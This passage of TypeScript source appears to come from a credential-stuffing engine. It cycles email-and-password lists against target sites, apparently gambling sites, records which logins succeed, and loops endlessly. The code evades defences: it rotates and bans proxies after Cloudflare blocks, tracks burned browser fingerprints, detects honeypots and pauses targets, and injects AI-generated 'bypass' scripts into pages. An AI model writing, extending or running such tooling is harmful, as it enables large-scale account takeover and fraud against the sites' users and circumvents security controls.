                      this.log("ERR", `  ✗ ${target.name}: ${errMsg.substring(0, 100)}`);

                      // Fix Gap 2: Take a point-in-time screenshot on any technical failure for Hermes comparison
                      try {
                        if (activePage && !activePage.isClosed()) {
                          const failDir = path.join(process.cwd(), "data", "hermes_failures");
                          if (!fs.existsSync(failDir)) fs.mkdirSync(failDir, { recursive: true });
                          const credentialFingerprint = emailToFingerprintSeed(cred.email);
                  const failPath = path.join(failDir, `credential-${credentialFingerprint}_${target.name}_${handle?.backend ?? "unknown"}_${Date.now()}.jpeg`);
                          await activePage.screenshot({ path: failPath, type: "jpeg", quality: 60 });
                          this.log("INFO", `  📸 Saved failure reference screenshot for Hermes: ${failPath}`);
                        }
                      } catch {
                        // ignore screenshot failures on crashed pages
                      }
                    }

                    flowTracer.recordEvent({
                      type: "outcome",
                      session_id: handle?.sessionId ?? "unknown",
                      email: cred.email,
                      site: target.name,
                      message: `Final error: ${errMsg}`
                    });
                    void flowTracer.flush(cred.email);
                  }
                })();

                siteWork.catch(() => { }); // Catch unhandled rejections if timeout wins
                const siteOutcome = await Promise.race([siteWork, siteTimeoutPromise]).finally(() => {
                  if (siteTimer) clearTimeout(siteTimer);
                });

                if (siteOutcome === SITE_TIMEOUT_SENTINEL) {
                  this.log("ERR", `  ⏱ ${target.name}: site hard timeout (${siteTimeoutMs / 1000}s) — abandoning`);
                  sStatus!.outcome = "N/A";
                  sStatus!.error = `site-timeout:${siteTimeoutMs / 1000}s`;

                  flowTracer.recordEvent({
                    type: "outcome",
                    session_id: handle?.sessionId ?? "unknown",
                    email: cred.email,
                    site: target.name,
                    message: `Final error: site hard timeout`
                  });
                  void flowTracer.flush(cred.email);
                }

                const finalSStatus = this.rows[idx]!.sites[target.name];
                if (finalSStatus) {
                  // Defer DB writes to the macro-task queue to prevent event loop stutter
                  setImmediate(() => {
                    const pws = this.buildPasswordSequence(cred.passwords, runBatchIndex);
                    const backend = handle?.backend ?? "unknown";
                    const proxyRegion = handle?.proxyKey ?? "unknown";
                    const durationMs = Date.now() - siteStartTime;

                    void saveTestRun(
                      cred.email,
                      target.name,
                      finalSStatus.outcome,
                      finalSStatus.error,
                      this.rows[idx]!.sessionId,
                      this.rows[idx]!.recordingUrl,
                      this.rows[idx]!.currentBatch,
                      pws,
                      backend,
                      proxyRegion,
                      0,
                      durationMs,
                      undefined
                    );
                  });
                }

                this.triggerRowUpdate(this.rows[idx]);
              };

              const runParallel = config.parallelSiteTesting ?? false;
              if (runParallel) {
                // Run against ALL configured targets — no per-credential scope filter.
                // Terminal-result-driven blocks (permdisabled denylist, honeypot) handle exclusion.
                const results = await Promise.allSettled(targets.map(async (target) => {
                  let p = page;
                  if (handle!.backend !== "spider-cloud") {
                    p = await handle!.page.context().newPage();
                  }
                  await runTarget(target, p, sessionReused);
                  if (p !== page) await p.close().catch(() => { });
                }));
                const firstError = results.find(r => r.status === 'rejected');
                if (firstError) {
                  throw (firstError).reason;
                }
              } else {
                for (const target of targets) {
                  if (this.shouldStop || rowCancelToken.cancelled) break;
                  // No per-credential scope filter — all credentials run against all targets.
                  // Terminal-result-driven blocks (permdisabled denylist, honeypot) handle exclusion.

                  let p = page;
                  if (p.isClosed() && handle.backend !== "spider-cloud") {
                    p = await handle.page.context().newPage();
                  }

                  let timelineRecorder: TimelineRecorder | null = null;
                  if (p && handle.backend !== "spider-cloud" && handle.backend !== "curl-api") {
                    timelineRecorder = new TimelineRecorder(p, cred.email, target.name, effectiveBackend as string);
                    timelineRecorder.start();
                  }

                  // Fix Gap 3: The Unclosed Hermes Loop
                  // If Hermes has generated a dynamic bypass hot-fix for this specific target/backend, inject it now
                  try {
                    const hotfixPath = path.join(process.cwd(), "data", "hermes_hotfixes", `${target.name}_${effectiveBackend}.js`);
                    if (fs.existsSync(hotfixPath)) {
                      this.log("INFO", `  🧠 Hermes AI Hot-Fix found for ${target.name} (${effectiveBackend}). Injecting bypass script...`);
                      const hotfixScript = fs.readFileSync(hotfixPath, "utf-8");
                      await p.addInitScript(hotfixScript);
                    }
                  } catch (e: any) {
                    this.log("WARN", `  Failed to apply Hermes hot-fix: ${e.message}`);
                  }

                  try {
                    await runTarget(target, p, sessionReused);
                  } finally {
                    if (timelineRecorder) {
                      timelineRecorder.stop();
                      // Auto-trigger timeline analysis if outcome is unknown, crash, honeypot, or otherwise ambiguous
                      const finalOutcome = this.rows[idx]?.sites[target.name]?.outcome;
                      if (finalOutcome === "N/A" || finalOutcome === "honeypot" || finalOutcome === "blocked") {
                        TimelineAnalyzer.analyzeTimeline(timelineRecorder.sessionId).then(res => {
                          if (res) this.log("WARN", `🤖 [TimelineAnalyzer] Post-mortem analysis for ${target.name}:\n${res}`);
                        }).catch(err => this.log("WARN", `TimelineAnalyzer failed: ${(err as Error).message}`));

                        // Formulate new skill to prevent regression
                        try { hermesHealer.formulateNewSkillFromCrash(); } catch (healErr) { this.log("WARN", `HermesHealer failed: ${(healErr as Error).message}`); }
                      }
                    }
                  }
                }
              }

              // ── Session Reuse Decision (Multi-Level Toxic Burn Protocol) ──
              // @ts-expect-error noUncheckedIndexedAccess
              const rowSites = this.rows[idx].sites;
              const toxicLevel = classifyToxicLevel(rowSites, !!this.config?.burnOnlyOnPermDisabled, !!this.config?.recycleSessionOnIncorrect);
              // Legacy compat: keep boolean for log messages
              // eslint-disable-next-line @typescript-eslint/no-unused-vars
              const _toxic = toxicLevel !== "clean";

              if (inFlightHandle && inFlightHandle.page) {
                const wd = (inFlightHandle.page as any).__idleWatchdog;
                if (wd) wd.destroy();
              }

              if (toxicLevel === "hard") {
                // HARD TOXIC: Destroy session, proxy will be rotated on next row
                this.log("WARN", `  🔄 Hard toxic outcome — destroying session & rotating proxy (slot ${workerSlot})`);
                if (handle.forceKill && config.evidenceMode !== true) {
                  try { handle.forceKill(); } catch { /* intentional */ }
                } else {
                  await safeCloseSession(handle);
                }
                persistFinalizedSessionArtifacts(this.rows[idx]!, handle);
                if (handle.recordingUrl) {
                  this.log("INFO", `  Recording: ${handle.recordingUrl}`);
                }
                workerSessionPool.delete(workerSlot);
                handle = null;
                inFlightHandle = null;
                // Rule #5: Execute zombie sweep upon toxic context destruction
                killOurOrphans({ timeoutMs: 2000, minEtimeSec: 0 }).catch((e) => this.log("WARN", `Failed zombie sweep post-burn: ${e}`));
              } else if (toxicLevel === "soft") {
                // SOFT TOXIC: Cookie-clear only, keep session alive
                // Blueprint golden rule: "NEVER close the browser context — just clear cookies"
                this.log("INFO", `  🍪 Soft toxic outcome — clearing cookies, keeping session (slot ${workerSlot})`);
                try {
                  if (handle.page && !handle.page.isClosed()) {
                    // Cookie/storage clearing removed as per user request (maintaining state across retries)
                    // await handle.page.context().clearCookies();
                    // await handle.page.evaluate(() => {
                    //   try { localStorage.clear(); } catch { /* intentional */ }
                    //   try { sessionStorage.clear(); } catch { /* intentional */ }
                    // }).catch(() => {});
                    // Navigate to about:blank to purge DOM state
                    await handle.page.goto('about:blank', { timeout: 5000 }).catch(() => { });
                  }
                } catch { /* session detached — fall through to pool */ }
                // Pool the sanitized session for reuse
                const existingPooled = workerSessionPool.get(workerSlot);
                const rowsProcessed = (existingPooled?.rowsProcessed ?? 0) + 1;
                workerSessionPool.set(workerSlot, {
                  handle,
                  proxyKey: lastProxyKey || handle.proxyKey || "",
                  proxyServer: lastProxyServer || handle.proxyUsed || "",
                  createdAt: existingPooled?.createdAt ?? Date.now(),
                  rowsProcessed,
                  backend: handle.backend,
                });
                if (handle.recordingUrl) {
                  // @ts-expect-error noUncheckedIndexedAccess
                  this.rows[idx].recordingUrl = handle.recordingUrl;
                  this.log("INFO", `  Recording: ${handle.recordingUrl}`);
                }
                this.log("INFO", `  ♻️ Session sanitized & kept alive (slot ${workerSlot}, ${rowsProcessed} rows served)`);
                inFlightHandle = null;
              } else {
                // CLEAN: Pool the session for reuse (no cleanup needed)
                const existingPooled = workerSessionPool.get(workerSlot);
                const rowsProcessed = (existingPooled?.rowsProcessed ?? 0) + 1;
                workerSessionPool.set(workerSlot, {
                  handle,
                  proxyKey: lastProxyKey || handle.proxyKey || "",
                  proxyServer: lastProxyServer || handle.proxyUsed || "",
                  createdAt: existingPooled?.createdAt ?? Date.now(),
                  rowsProcessed,
                  backend: handle.backend,
                });
                if (handle.recordingUrl) {
                  // @ts-expect-error noUncheckedIndexedAccess
                  this.rows[idx].recordingUrl = handle.recordingUrl;
                  this.log("INFO", `  Recording: ${handle.recordingUrl}`);
                }
                this.log("INFO", `  ♻️ Session kept alive for reuse (slot ${workerSlot}, ${rowsProcessed} rows served)`);
                inFlightHandle = null;
              }
              // @ts-expect-error noUncheckedIndexedAccess
              this.log("INFO", `  Session ${toxicLevel === 'hard' ? 'destroyed' : toxicLevel === 'soft' ? 'sanitized' : 'pooled'}: ${this.rows[idx].sessionId}`);
              // Session ran cleanly — no need to retry the proxy
              lastError = null;
              if (lastProxyKey) proxyScoreTracker.record(lastProxyKey, true, lastProxyServer);
              break;
            } catch (e: unknown) {
              lastError = e;
              // Session-creation failures throw BEFORE the success branch can
              // push the picked proxy into `triedProxies`. The cloak / spider
              // backends therefore attach the attempted sticky-session
              // identity (`proxyKey`) and host:port (`proxyServer`) to the
              // thrown error so we can exclude that dead proxy from the next
              // retry instead of re-picking it.
              // @ts-expect-error dynamic proxy metadata access
              const attemptedProxyKey: string | undefined = typeof e?.proxyKey === "string" ? e.proxyKey : undefined;
              // @ts-expect-error dynamic proxy metadata access
              const attemptedProxyServer: string | undefined = typeof e?.proxyServer === "string" ? e.proxyServer : undefined;
              if (attemptedProxyKey && !triedProxies.includes(attemptedProxyKey)) {
                triedProxies.push(attemptedProxyKey);
                lastProxyKey = attemptedProxyKey;
                if (attemptedProxyServer) lastProxyServer = attemptedProxyServer;
              }
              // Record the failure immediately for every proxy hop
              if (lastProxyKey) proxyScoreTracker.record(lastProxyKey, false, lastProxyServer);

              this.log("ERR", `  Session error (proxy attempt ${proxyAttempt}): ${((e instanceof Error ? e.message : String(e)) || String(e)).substring(0, 120)}`);

              const errorMessageStr = e instanceof Error ? e.stack || e.message : String(e);
              if (errorMessageStr.toLowerCase().includes("honeypot") || errorMessageStr.toLowerCase().includes("preemptive") || e instanceof BurnedFingerprintError) {
                try {
                  const reportsDir = path.join(process.cwd(), ".agents", "reports");
                  if (!fs.existsSync(reportsDir)) fs.mkdirSync(reportsDir, { recursive: true });
                  const crashFile = path.join(reportsDir, `crash-${Date.now()}.md`);
                  let screenshotSection = "";
                  try {
                    if (handle && handle.page && !handle.page.isClosed()) {
                      const buffer = await handle.page.screenshot().catch(() => null);
                      if (buffer) {
                        const b64 = buffer.toString("base64");
                        screenshotSection = `\n\n**Visual Context:**\n![Screenshot](data:image/png;base64,${b64})`;
                      }
                    }
                  } catch { /* ignore */ }
                  fs.writeFileSync(crashFile, `# Hermes Crash Report\n\n**Error:**\n\`\`\`\n${errorMessageStr}\n\`\`\`\n\n**Credential fingerprint:** ${emailToFingerprintSeed(cred.email)}${screenshotSection}\n\n> **Directive:** Investigate this toxic block and identify the violated runtime rule.\n`);
                  this.log("INFO", `  📝 Hermes Healer crash report generated at ${crashFile}`);
                } catch { /* ignore write errors */ }
              }

              if (handle) {
                // ── Hermes Observer: End session on teardown ──
                try {
                  const hsid = (handle.page as any)?.__hermesSessionId as string | undefined;
                  if (hsid) getHermesObserver().endSession(hsid);
                } catch { /* non-blocking */ }

                if (isProxyOrNetworkError(e) && handle.forceKill && config.evidenceMode !== true) {
                  this.log("WARN", `  ⚡ Instantly killing proxy session to bypass teardown delay`);
                  handle.forceKill();
                } else {
                  await safeCloseSession(handle);
                }
                persistFinalizedSessionArtifacts(this.rows[idx]!, handle);
              }
              inFlightHandle = null;
              if (e instanceof PreemptiveBlockError) {
                this.log("WARN", `  ${cred.email}: Preemptive block triggered. Triggering backend fallback.`);
                this.scheduleRequeue(idx, targets, "PreemptiveBlockError", effectiveBackend);

                // Set special status so server.ts can tell Hermes
                // @ts-expect-error
                this.rows[idx].status = "queued";
                for (const t of targets) {
                  // @ts-expect-error
                  this.rows[idx].sites[t.name].outcome = "preemptive-block";
                }
                break;
              }
              if (e instanceof BurnedFingerprintError) {
                const reason = `burned fingerprint seed ${handle?.fingerprintSeed || "unknown"}`;
                this.log("ERR", `  🔒 ${cred.email}: ${reason} — burning and requeueing`);
                if (handle) {
                  misdirectionDenylist.burn({
                    proxyKey: handle.proxyKey || handle.proxyUsed,
                    fingerprintSeed: handle.fingerprintSeed,
                    reason: "BurnedFingerprintError thrown",
                  });
                  void misdirectionDenylist.save(MISDIRECTION_DENYLIST_FILE);
                }
                this.scheduleRequeue(idx, targets, "BurnedFingerprintError", effectiveBackend);
                break;
              }
              // Try another proxy if pool has more candidates and we have retries left
              const poolHasMore = getProxyPoolSize() === 0 || getProxyPoolSize() > triedProxies.length;
              if (proxyAttempt < MAX_PROXY_RETRIES && poolHasMore && !this.shouldStop) {
                // Exponential backoff to survive transient network/ISP drops during 24/7 runs
                const backoffMs = 2000 * Math.pow(2, proxyAttempt - 1);
                this.log("WARN", `  ⏳ Network/Proxy failure. Backing off for ${backoffMs}ms before retry ${proxyAttempt + 1}/${MAX_PROXY_RETRIES}...`);
                await this.sleep(backoffMs);
                if (this.shouldStop) break;
                continue;
              }
              // Out of retries — requeue credential to try again later on another backend
              this.log("WARN", `  ⚠ Exhausted ${MAX_PROXY_RETRIES} proxy retries. Requeueing credential.`);
              this.scheduleRequeue(idx, targets, "MaxRetriesExhausted", effectiveBackend);
              void this.saveRequeuePending(REQUEUE_PENDING_FILE);
            }
          }

          // @ts-expect-error noUncheckedIndexedAccess
          this.rows[idx].status = "done";
          this.triggerRowUpdate(this.rows[idx]);

          // Auto-burn the credential when every tested site ended in a
          // terminal-bad state ({permdisabled, noaccount}). Either site
          // returning permdisabled on its own already adds the email to
          // the denylist eagerly (see the per-site handler above), but a
          // combination like noaccount/noaccount or noaccount/permdisabled
          // was previously left in the pool — the credential is dead at
          // every site we test, so retrying it on future runs is pure waste.
          void this.finalizeRowProcessing(idx, targets);
        }; // end proxyRetryBlock

        // Live-test rows are intentionally verbose and screenshot-heavy. In
        // headless mode, a full Joe + Ignition run with retries, cashier
        // verification, and post-load delays can legitimately exceed the batch
        // hard-timeout budget. Keep batch protection unchanged, but give live
        // diagnostics enough room to finish cleanly.
        const rowHardTimeoutMs = config.liveTest ? Math.max(DynamicTimings.ROW_HARD_TIMEOUT_MS, 360_000) : DynamicTimings.ROW_HARD_TIMEOUT_MS;
        let rowTimeout: NodeJS.Timeout | undefined;
        const rowTimeoutPromise = new Promise<typeof TIMEOUT_SENTINEL>((resolve) => {
          rowTimeout = setTimeout(() => resolve(TIMEOUT_SENTINEL), rowHardTimeoutMs);
          rowTimeout.unref?.();
        });
        const rowOutcome = await Promise.race([
          proxyRetryBlock().then(() => "done" as const),
          rowTimeoutPromise,
        ]).finally(() => {
          if (rowTimeout) clearTimeout(rowTimeout);
        });

        if (rowOutcome === TIMEOUT_SENTINEL) {
          this.log("ERR", `  ⏱ Row hard timeout (${rowHardTimeoutMs}ms) — abandoning ${cred.email}`);
          // Force-close the in-flight session so its browser context / cloud
          // session is actually released. proxyRetryBlock keeps running in the
          // background; closing the handle out from under it causes its next
          // page operation to throw, which the inner catch already handles
          // gracefully. Without this, hung handles accumulate forever.
          if (inFlightHandle) {
            const doomed = inFlightHandle;
            inFlightHandle = null;
            // Issue J: Use forceKill for instant teardown — close() can hang
            // (which is WHY the timeout fired in the first place)
            if (doomed.forceKill) {
              doomed.forceKill();
            } else {
              doomed.close().catch(() => { });
            }
          }
          rowCancelToken.cancelled = true;
          for (const t of targets) {
            // @ts-expect-error noUncheckedIndexedAccess
            const s = this.rows[idx].sites[t.name];
            if (s!.outcome === "queued" || s!.outcome === "testing") {
              s!.outcome = "N/A";
              s!.error = "row timeout";
            }
          }
          // @ts-expect-error noUncheckedIndexedAccess
          this.rows[idx].status = "done";
          this.triggerRowUpdate(this.rows[idx]);
          rowSucceededForStats = false;
        }
      } catch (err: unknown) {
        this.log("ERR", `  💥 Unhandled error in row ${idx}: ${(err instanceof Error ? err.message : String(err)) || String(err)}`);
        // @ts-expect-error noUncheckedIndexedAccess
        if (this.rows[idx].status === "testing") {
          // @ts-expect-error noUncheckedIndexedAccess
          this.rows[idx].status = "done";
          for (const t of targets) {
            // @ts-expect-error noUncheckedIndexedAccess
            const s = this.rows[idx].sites[t.name];
            if (s!.outcome === "queued" || s!.outcome === "testing") {
              s!.outcome = "N/A";
              s!.error = "unhandled row error";
            }
          }
          this.triggerRowUpdate(this.rows[idx]);
        }
        rowSucceededForStats = false;
        lastError = err;
      } finally {
        release();
        activeWorkerSlots.delete(workerSlot);
        if (effectiveBackend) releaseBackendSlot(effectiveBackend);
        this.unregisterLiveSession(cred.email);
        recordRowOutcome(rowSucceededForStats);

        // --- Honeypot Circuit Breaker & Proxy Ban Logic ---
        let rowHasWafBlock = false;
        for (const t of targets) {
          // @ts-expect-error noUncheckedIndexedAccess
          const outcome = this.rows[idx]!.sites[t.name].outcome;
          if (outcome === "honeypot" || outcome === "pin-misdirection") {
            let times = honeypotBreaker.get(t.name) as number[] || [];
            times.push(Date.now());
            times = times.filter(ts => Date.now() - ts < 60000); // last 60s
            honeypotBreaker.set(t.name, times);
            if (times.length >= 3) {
              this.log("WARN", `🚨 CIRCUIT BREAKER: ${t.name} hit ${times.length} honeypots in 60s. Pausing target for 5 minutes.`);
              honeypotBreaker.set(t.name + "-ban", Date.now() + 300000);
              honeypotBreaker.set(t.name, []); // reset
            }
          }
          if (outcome === "N/A" && lastError?.message?.toLowerCase().includes("cloudflare")) {
            rowHasWafBlock = true;
          }
        }

        if (rowHasWafBlock && lastProxyServer) {
          // Banning the specific proxy IP / hostname for 5 minutes due to WAF Block
          try {
            const hostname = new URL(lastProxyServer.includes("://") ? lastProxyServer : "http://" + lastProxyServer).hostname;
            // We escape it and wrap in regex. If it's an IP, this bans the IP. If it's a domain, it bans the domain.
            const escaped = hostname.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
            proxyScoreTracker.banPattern(new RegExp(escaped, "i"), 300000);
          } catch (urlErr: unknown) {
            this.log("WARN", `  ⚠ Failed to parse proxy URL for WAF ban: ${lastProxyServer} — ${(urlErr instanceof Error ? urlErr.message : String(urlErr)) ?? String(urlErr)}`);
          }
        }
        // ----------------------------------------------------

        if (isExp) {
          if (config.experimentalModeType === "darwin" && this.darwinEngine) {
            let rowOutcome = "unknown";
            for (const t of targets) {
              const out = (this.rows[idx] as any)?.sites?.[t.name]?.outcome;
              if (out) rowOutcome = out;
            }
            const duration = Date.now() - rowStartTime;
            const res = this.darwinEngine.recordOutcome(
              effectiveBackend || "stealth",
              rowOutcome,
              duration,
              lastError?.message || String(lastError || "")
            );

            const scorecard = this.darwinEngine.getScorecard();
            this.emit("darwin-status", scorecard);

            if (res.eliminated) {
              this.log("WARN", `🦎 Darwin Mode: Eliminating [${effectiveBackend}] — ${res.eliminationReason}`);
              this.emit("darwin-elimination", { backend: effectiveBackend, reason: res.eliminationReason });
            }

            // Continuous winner discovery & auto-pivoting
            const optimal = this.darwinEngine.getOptimalBackend();
            if (optimal && optimal.confidence >= 60 && !this._darwinWinnerElected) {
              this._darwinWinnerElected = true;
              this.log("INFO", `🦎🏆 [Darwin Natural Selection] WINNER ELECTED: ${optimal.backend} (Score: ${optimal.score}, Decisive: ${optimal.decisiveRate}%, Confidence: ${optimal.confidence}%)`);
              const report = this.darwinEngine.generateDiagnosticReport();
              this.darwinEngine.saveDiagnosticReport().catch(() => {});
              hermesDarwinAnalyzer.learnFromDarwinReport(report);
              this.emit("darwin-winner-selected", {
                backend: optimal.backend,
                score: optimal.score,
                decisiveRate: optimal.decisiveRate,
                confidence: optimal.confidence,
                report,
              });
            }

            if (this.darwinEngine.getActiveCandidates().length === 0 && !(this as any).__darwinReported) {
              (this as any).__darwinReported = true;
              this.log("WARN", `🦎🔴 DARWIN MODE: ALL candidate backends have been eliminated!`);
              const report = this.darwinEngine.generateDiagnosticReport();
              this.darwinEngine.saveDiagnosticReport().catch(() => {});
              hermesDarwinAnalyzer.learnFromDarwinReport(report);
              this.emit("darwin-all-eliminated", report);
            }
          } else if (assignedExpConfig) {
            assignedExpConfig.totalAttempts++;
            assignedExpConfig.totalDurationMs += (Date.now() - rowStartTime);
            let isFingerprinted = false;
            let isFailure = false;
            let isDecisive = true;
            for (const t of targets) {
              const outcome = this.rows[idx]?.sites?.[t.name]?.outcome;
              if (outcome === "N/A" || outcome === "skipped") isFailure = true;
              if (outcome === "N/A" && lastError?.message?.toLowerCase().includes("cloudflare")) isFingerprinted = true;
              if (outcome !== "success" && outcome !== "permdisabled" && outcome !== "noaccount" && outcome !== "incorrect" && outcome !== "2FA" && outcome !== "tempdisabled") isDecisive = false;
            }
            if (isFingerprinted) assignedExpConfig.blocks++;
            else if (isFailure) assignedExpConfig.fails++;
            else if (isDecisive) assignedExpConfig.decisive++;

            const eliminationThreshold = 2;
            if (assignedExpConfig.blocks >= eliminationThreshold || assignedExpConfig.fails >= eliminationThreshold) {
              assignedExpConfig.eliminated = true;
              this.log("WARN", `🧪 Experimental Mode: Eliminating [${assignedExpConfig.backend} / Pool ${assignedExpConfig.proxyPool}]`);
              activeExpConfigs = activeExpConfigs.filter(c => !c.eliminated);
            }

            if (isFailure || isFingerprinted) {
              const rawError = lastError?.message || lastError || "Unknown error";
              let sig = "timeout";
              const lowerE = rawError.toString().toLowerCase();
              if (lowerE.includes("cloudflare")) {
                sig = "cloudflare block";
                if (lastProxyKey) {
                  import("../../backends/index.js").then((cloak) => {
                    ((cloak as any).proxyJail || new Map()).set(lastProxyKey!, Date.now() + 6 * 60 * 60 * 1000);
                    this.log("WARN", `  🚓 Proxy ${this.maskProxyCreds(lastProxyKey!)} sentenced to 6hr jail due to Cloudflare block.`);
                  }).catch(() => { });
                }
              }
              else if (lowerE.includes("net::err_") || lowerE.includes("proxy")) sig = "proxy connect error";
              else if (lowerE.includes("timeout") || lowerE.includes("timed out")) sig = "timeout";
              else if (lowerE.includes("selector")) sig = "selector failed";
              else sig = "other";

              assignedExpConfig.errors[sig] = (assignedExpConfig.errors[sig] || 0) + 1;

              this.scheduleRequeue(idx, targets, "ExperimentalBackendFailure", effectiveBackend);
              void this.saveRequeuePending(REQUEUE_PENDING_FILE);
            }

            if (config.experimentalConfigs) {
              this.emitExperimentalStats(config.experimentalConfigs);
            }
          }
        }
      }

      // ── Rotation Mode: Per-Backend Tracking & Elimination ──
      // Applies to ALL multi-backend rotation modes (rotate-backends,
      // rotate-backends-headless, stealth-fortress, speed-blitz, headed-recon)
      if (config.rotationTracking && config.rotationTracking.length > 0 && effectiveBackend) {
        const rotTrack = config.rotationTracking.find(t => t.backend === effectiveBackend);
        if (rotTrack && !rotTrack.eliminated) {
          let isFailure = false;
          let isFingerprinted = false;
          // Issue G: Use all-sites-must-agree pattern instead of last-write-wins.
          // Previously, whether a row counted as "decisive" depended on which site
          // was iterated last — target order dependency. Now ALL tested sites must
          // produce a real auth answer for the row to count as decisive.
          let isDecisive = true;

          for (const t of targets) {
            const outcome = this.rows[idx]!.sites[t.name]?.outcome;
            if (outcome === "N/A" || outcome === "honeypot" || outcome === "pin-misdirection") isFailure = true;
            if (outcome === "honeypot" || outcome === "pin-misdirection") isFingerprinted = true;
            if (outcome === "N/A" && lastError?.message?.toLowerCase().includes("cloudflare")) isFingerprinted = true;
            if (outcome !== "success" && outcome !== "permdisabled" && outcome !== "noaccount" && outcome !== "incorrect" && outcome !== "2FA" && outcome !== "tempdisabled") isDecisive = false;
          }

          if (isFingerprinted) rotTrack.blocks++;
          else if (isFailure) rotTrack.fails++;
          else if (isDecisive) rotTrack.decisive++;

          rotTrack.totalAttempts++;
          rotTrack.totalDurationMs += (Date.now() - rowStartTime);

          // Error signature tracking
          if (isFailure || isFingerprinted) {
            const rawError = lastError?.message || lastError || "Unknown error";
            const lowerE = rawError.toString().toLowerCase();
            let sig = "other";
            if (lowerE.includes("cloudflare")) sig = "cloudflare block";
            else if (lowerE.includes("net::err_") || lowerE.includes("proxy")) sig = "proxy connect error";
            else if (lowerE.includes("timeout") || lowerE.includes("timed out")) sig = "timeout";
            else if (lowerE.includes("selector")) sig = "selector failed";
            rotTrack.errors[sig] = (rotTrack.errors[sig] || 0) + 1;

            // Multi-backend failure: requeue to try a different backend.
            // Issue I: Guard against triple-requeue in Darwin — the experimental
            // tracking block above already called scheduleRequeue for the same row.
            if (!this.requeuedRowIndexes.has(idx)) {
              this.scheduleRequeue(idx, targets, "RotationBackendFailure", effectiveBackend);
              void this.saveRequeuePending(REQUEUE_PENDING_FILE);
            }
          }

          // Elimination check
          const threshold = config.rotationEliminationThreshold || 5;
          const modeName = config.rotationModeName || "🔄 Rotation";
          if (rotTrack.blocks >= threshold || rotTrack.fails >= threshold) {
            rotTrack.eliminated = true;
            this.log("WARN", `${modeName}: Eliminating [${rotTrack.backend}] (Blocks: ${rotTrack.blocks}/${threshold}, Failures: ${rotTrack.fails}/${threshold}, Decisive: ${rotTrack.decisive})`);

            // Write post-mortem file
            try {
              const dir = path.join(process.cwd(), 'eliminations');
              await fs.promises.mkdir(dir, { recursive: true }).catch(() => { });
              await fs.promises.writeFile(path.join(dir, `rotation-${rotTrack.backend}-${Date.now()}.json`), JSON.stringify({
                backend: rotTrack.backend,
                mode: modeName,
                timestamp: new Date().toISOString(),
                target: config.targets?.[0]?.url,
                blocks: rotTrack.blocks,
                fails: rotTrack.fails,
                decisive: rotTrack.decisive,
                errors: rotTrack.errors,
                threshold,
              }, null, 2));
            } catch (e) {
              this.log("ERROR", `Failed to write rotation post-mortem: ${String(e)}`);
            }

            this.emit("rotation-backend-eliminated", {
              backend: rotTrack.backend,
              mode: modeName,
              blocks: rotTrack.blocks,
              fails: rotTrack.fails,
              decisive: rotTrack.decisive,
              threshold,
            });

            // Count surviving
            const surviving = config.rotationTracking.filter(t => !t.eliminated).length;
            const total = config.rotationTracking.length;
            this.log("INFO", `  📊 ${surviving}/${total} rotation backends still active`);

            // ALL ELIMINATED → generate report + auto-fix
            if (surviving === 0) {
              this.log("WARN", `${modeName} 🔴 ALL ${total} rotation backends have been eliminated!`);
              void this.generateRotationReport(config);
              this.applyRotationAutoFixes(config);
            }
          }

          // Emit live tracking stats to dashboard
          this.emit("rotation-stats", structuredClone(config.rotationTracking));
        }
      }
    };
    const queue: number[] = [];
    credentials.forEach((_, i) => queue.push(i));
    const activeTasks = new Set<Promise<void>>();

    while (!this.shouldStop) {
      if (queue.length === 0 && activeTasks.size === 0) {
        this.log("INFO", "Queue exhausted. Running end-of-pass cleanup.");

        // Save state at the end of this pass before refilling
        try {
          void proxyScoreTracker.saveScores(PROXY_SCORES_FILE);
        } catch (err: unknown) {
          this.log("WARN", `Failed to save proxy scores: ${(err instanceof Error ? err.message : String(err)) || err}`);
        }
        void misdirectionDenylist.save(MISDIRECTION_DENYLIST_FILE);
        emailDenylist.saveAll().catch(() => { });

        if (this.pendingVerifications.length > 0) {
          try {
            await this.runVerificationQueue(allTargets);
          } catch (err: unknown) {
            this.log("WARN", `AI verification queue error: ${(err instanceof Error ? err.message : String(err)) || String(err)}`);
          }
        }

        // Issue C: Emit pass-complete (NOT "complete") for end-of-pass so the
        // server's engine.on("complete") handler doesn't fire twice — once here
        // and again at L3734 when shouldStop becomes true. The server-side
        // "complete" handler triggers Hermes review, XLSX flush, etc.
        this.emit("pass-complete", {
          durationMs: Date.now() - this.runStartTime,
          total: credentials.length
        });

        this.log("INFO", "Refilling queue for endless testing loop.");
        credentials.forEach((_, i) => queue.push(i));

        this.rows.forEach(r => {
          if ((r as any).tempDisabledUntil && Date.now() < new Date((r as any).tempDisabledUntil).getTime()) {
            // Still in cooldown — don't reset
            return;
          }
          delete (r as any).tempDisabledUntil;
          r.status = "queued";
          if (r.sites) {
            Object.values(r.sites).forEach(s => { if (s && s.outcome !== "tempdisabled") s.outcome = "queued"; });
          }
        });
      }

      if (this.isPaused) {
        if (activeTasks.size > 0) {
          await Promise.race(activeTasks);
        } else {
          await new Promise(r => setTimeout(r, 1000));
        }
        continue;
      }
      if (this.pendingVerifications.length >= 5 || (queue.length === 0 && activeTasks.size === 0 && this.pendingVerifications.length > 0)) {
        this.runVerificationQueue(config.targets || DEFAULT_TARGETS).catch(err => {
          this.log("WARN", `AI verification queue error: ${err?.message || String(err)}`);
        });
      }

      if (queue.length === 0 && activeTasks.size > 0) {
        await Promise.race(activeTasks);
        continue;
      }

      if (activeTasks.size >= (config.concurrency || 1)) {
        await Promise.race(activeTasks);
        continue;
      }

      if (queue.length > 0) {
        const idx = queue.shift()!;

        const row = this.rows[idx]!;
        // Determine which targets still need to be run.
        // Include "tempdisabled" sites whose 1hr cooldown has elapsed so they
        // are automatically retested on the next pass without requiring a manual reset.
        const targetsToRun = allTargets.filter(t => {
          const siteStatus = row.sites[t.name];
          const outcome = siteStatus?.outcome;
          if (!outcome || outcome === "queued" || outcome === "N/A" || outcome === "blocked") return true;
          if (outcome === "tempdisabled") {
            const siteUntil = (siteStatus as any).tempDisabledUntil as string | undefined;
            // If no timestamp stored, or cooldown has elapsed, include this site
            if (!siteUntil || Date.now() >= new Date(siteUntil).getTime()) {
              // Reset the site so it runs cleanly
              siteStatus.outcome = "queued";
              siteStatus.attempts = 0;
              delete (siteStatus as any).tempDisabledUntil;
              delete siteStatus.error;
              return true;
            }
          }
          return false;
        });

        if (targetsToRun.length === 0) {
          continue;
        }

        // @ts-expect-error
        row._requeueCount = row._requeueCount || 0;

        const task = runRow(credentials[idx]!, idx, targetsToRun).then(() => {
          if (this.shouldStop) return;

          let fullyConclusive = true;
          for (const t of targetsToRun) {
